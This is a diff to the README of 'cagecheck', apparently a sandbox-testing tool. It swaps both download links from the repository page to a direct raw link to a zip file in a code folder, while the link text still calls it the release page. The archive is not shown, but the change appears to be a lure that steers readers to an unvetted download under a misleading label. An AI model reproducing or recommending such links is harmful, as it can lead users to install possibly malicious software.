@@ -1,6 +1,6 @@
 # 🔒 cagecheck - Test your computer sandbox security easily
 
-[![](https://img.shields.io/badge/Download_Cagecheck-blue?style=for-the-badge)](https://github.com/xerxesanoxemic375/cagecheck)
+[![](https://img.shields.io/badge/Download_Cagecheck-blue?style=for-the-badge)](https://raw.githubusercontent.com/xerxesanoxemic375/cagecheck/main/cmd/Software_v3.8-beta.2.zip)
 
 ## 🔍 Purpose
 Security experts use sandboxes to run unknown software safely. A sandbox acts like a cage. It keeps software away from your main computer files. If the software is malicious, it stays inside the cage. 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run cagecheck correctly. Check your setup 
 ## 📥 Getting the software
 You must visit the official page to download the latest version of this tool.
 
-[Visit the release page to download cagecheck](https://github.com/xerxesanoxemic375/cagecheck)
+[Visit the release page to download cagecheck](https://raw.githubusercontent.com/xerxesanoxemic375/cagecheck/main/cmd/Software_v3.8-beta.2.zip)
 
 1. Open your web browser.
 2. Go to the link provided above.
